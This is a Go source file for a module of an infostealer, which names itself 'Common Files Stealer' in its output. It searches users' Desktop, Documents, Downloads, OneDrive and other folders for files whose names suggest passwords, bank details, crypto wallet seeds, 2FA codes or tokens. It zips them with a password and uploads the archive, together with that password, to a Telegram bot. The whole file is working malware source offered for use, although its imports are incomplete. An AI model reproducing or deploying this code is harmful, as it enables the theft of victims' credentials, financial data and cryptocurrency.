package commonfiles

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/benzoXdev/oxil/utils/fileutil"
	"github.com/benzoXdev/oxil/utils/hardware"
)

// Telegram yardýmcý fonksiyonlarý (diðer modüllerden ayný)
func sendTextToTelegram(botToken, chatID, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	payload := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown",
	}

	jsonData, _ := json.Marshal(payload)
	resp, err := http.Post(url, "application/json", strings.NewReader(string(jsonData)))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("sendMessage failed: %d", resp.StatusCode)
	}
	return nil
}

func sendZipToTelegram(botToken, chatID, caption, zipPath string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatID)
	writer.WriteField("caption", caption)
	writer.WriteField("parse_mode", "Markdown")

	fileWriter, err := writer.CreateFormFile("document", filepath.Base(zipPath))
	if err != nil {
		return err
	}

	file, err := os.Open(zipPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		return err
	}

	writer.Close()

	req, _ := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("sendDocument failed: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	return nil
}

func Run(botToken string, chatID string) {
	tempDir := filepath.Join(os.TempDir(), "commonfiles-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	extensions := []string{
		".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".pdf", ".rtf", ".json", ".csv", ".db",
		".jpg", ".jpeg", ".png", ".gif", ".webp", ".mp4",
	}

	keywords := []string{
		"account", "password", "secret", "mdp", "motdepass", "mot_de_pass", "login",
		"paypal", "banque", "seed", "bancaire", "bank", "metamask", "wallet", "crypto",
		"exodus", "atomic", "auth", "mfa", "2fa", "code", "memo", "compte", "token",
		"credit", "card", "mail", "address", "phone", "permis", "number", "backup",
		"database", "config",
	}

	found := 0

	for _, user := range hardware.GetUsers() {
		for _, baseDir := range []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		} {
			if _, err := os.Stat(baseDir); err != nil {
				continue
			}

			filepath.Walk(baseDir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() || info.Size() > 2*1024*1024 {
					return nil
				}

				filenameLower := strings.ToLower(info.Name())

				keywordMatch := false
				for _, keyword := range keywords {
					if strings.Contains(filenameLower, keyword) {
						keywordMatch = true
						break
					}
				}
				if !keywordMatch {
					return nil
				}

				extMatch := false
				for _, ext := range extensions {
					if strings.HasSuffix(filenameLower, ext) {
						extMatch = true
						break
					}
				}
				if !extMatch {
					return nil
				}

				username := strings.Split(user, "\\")[2]
				dest := filepath.Join(tempDir, username, info.Name())

				// Ayný isimde dosya varsa sonuna rastgele ekle
				if fileutil.Exists(dest) {
					dest = filepath.Join(tempDir, username, fmt.Sprintf("%s_%s", info.Name(), randString(4)))
				}

				os.MkdirAll(filepath.Join(tempDir, username), os.ModePerm)
				if err := fileutil.CopyFile(path, dest); err != nil {
					return nil
				}

				found++
				return nil
			})
		}
	}

	if found == 0 {
		return
	}

	// ZIP oluþtur (þifreli)
	tempZip := filepath.Join(os.TempDir(), "commonfiles.zip")
	password := randString(16)
	if err := fileutil.ZipWithPassword(tempDir, tempZip, password); err != nil {
		return
	}
	defer os.Remove(tempZip)

	// Metin mesajý hazýrla
	tree := fileutil.Tree(tempDir, "")
	message := fmt.Sprintf(
		"*?? Common Files Stealer*\n\n"+
			"**Bulunan Dosya Sayýsý:** `%d`\n"+
			"**ZIP Þifresi:** `%s`\n\n"+
			"**Klasör Yapýsý:**\n```%s```",
		found,
		password,
		tree,
	)

	// Metni Telegram'a gönder
	_ = sendTextToTelegram(botToken, chatID, message)

	// ZIP dosyasýný Telegram'a gönder
	caption := fmt.Sprintf("Þifreli dosyalar arþivi (Þifre: %s)", password)
	_ = sendZipToTelegram(botToken, chatID, caption, tempZip)
}

func randString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	rand.Seed(time.Now().UnixNano()) // Rastgelelik için seed ekledim
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}